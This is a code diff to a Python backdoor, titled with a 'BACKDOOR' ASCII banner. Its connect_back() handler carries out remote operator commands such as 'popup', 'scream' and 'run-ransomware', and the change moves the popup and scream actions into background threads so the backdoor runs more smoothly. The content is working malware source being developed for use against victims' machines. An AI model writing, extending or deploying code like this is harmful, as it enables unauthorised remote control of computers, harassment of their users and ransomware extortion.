@@ -9,6 +9,7 @@ import shlex
 import pyautogui
 import random
 import ctypes
+import threading
 from time import sleep
 banner = r"""
 ██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ██████╗ 
@@ -333,12 +334,12 @@ def connect_back():
             if cmd.lower().startswith('popup'):
                 args = cmd.split(' ')
                 if len(args) > 1:
-                    open_popup(args[1])
+                    threading.Thread(target=open_popup, args=(args[1],), daemon=True).start()
                 else:
-                    open_popup()
+                    threading.Thread(target=open_popup, daemon=True).start()
                 continue
             if cmd.lower() == 'scream':
-                scream()
+                threading.Thread(target=scream, daemon=True).start()
                 continue
             if cmd.lower() == "run-ransomware":
                 run_ransomware()
